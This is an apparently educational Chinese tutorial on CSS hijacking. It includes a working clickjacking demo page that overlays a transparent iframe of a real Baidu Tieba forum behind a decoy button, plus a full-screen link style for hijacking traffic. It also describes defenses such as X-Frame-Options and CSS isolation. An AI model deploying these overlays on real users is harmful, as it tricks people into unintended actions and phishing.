# CSS劫持攻击
`CSS`劫持是一种并不很受重视的劫持方式，但是其也有一定的危害，且由于其并不一定需要依赖`JavaScript`，这使得此种攻击方式更容易实现。

## ClickJacking点击劫持
当访问某网站时，利用`CSS`将攻击者实际想让你点击的页面进行透明化隐藏，然后在页面后显示 一些东西诱导让你点击，点击后则会在用户毫不知情的情况下做了某些操作，这就是点击劫持`ClickJacking`。

### iframe覆盖
假如现在我们有个贴吧，想让人关注，可以构造一个钓鱼页面，诱导用户点击，实际上攻击者想要用户点击的关注页面是个透明的，用户如果在网页端登录了贴吧，就会在毫不知情的情况下关注了贴吧，这属于危害较小的情况，若是搭配一些表单诱导用户在页面输入某些敏感信息甚至可以构成财产损失的情况。

```html
<!DOCTYPE HTML>
<html>
<meta content="text/html; charset=utf8" />
<head>
<title>ClickJacking点击劫持</title>
<style>
     html,body,iframe{
         display: block;
          height: 100%;
          width: 100%;
          margin: 0;
          padding: 0;
          border:none;
     }
     iframe{
          opacity:0.2;
          position:absolute;
          z-index:2;
     }
     div{
          display: flex;
          justify-content: space-around;
          position:absolute;
          top: 335px;
          left: 310px;
          z-index: 1;
          width: 300px;
          height: 26px;
     }
</style>
</head>
     <body>
          <!-- 例子中的按钮位置是写定的，在不同分辨率下并不一定合适，应该动态确定按钮位置，但是作为一个Demo就不作过多操作了 -->
          <div>那些不能说的秘密<button>查看详情</button></div>
          <iframe src="https://tieba.baidu.com/f?kw=%E6%96%97%E7%A0%B4%E8%8B%8D%E7%A9%B9%E5%8A%A8%E6%BC%AB"></iframe>
     </body>
</html>
```
### 防御
`X-FRAME-OPTIONS`是目前最可靠的方法。  
`X-FRAME-OPTIONS`是微软提出的一个`HTTP`头，专门用来防御利用`iframe`嵌套的点击劫持攻击。
```
DENY // 拒绝任何域加载
SAMEORIGIN // 允许同源域下加载
ALLOW-FROM // 可以定义允许frame加载的页面地址
```

## CSS劫持流量
关于诱导用户点击进入网站的操作，利用`CSS`劫持也不失为一个好的思路，无论是论坛，还是邮件都有一个富文本编辑器，如果网站并未注意此种攻击方式并特殊处理，便很容易被利用。  
将富文本插入一个链接，在正常情况下应该是`<a href="xxx"></a>`，假如我们为其赋予一个样式，或者将其内部包裹一个字体的样式，将样式设置为`display: block;z-index: 100000;position: fixed;top: 0;left: 0;width: 1000000px;height: 100000px;`,也是就是让链接作为块级元素充满整个屏幕，则用户无论点击页面中的任何地方都会跳转到你指定的页面，这就将流量劫持到了你的页面，若用户并未注意到`url`的改变，还可以在跳转的新页面进行钓鱼，对于这种攻击方式通常可以采用`CSS`隔离的方式解决，例如`css module`、`shadow dom`，`namespace`等。

## 每日一题

```
https://github.com/WindrunnerMax/EveryDay
```
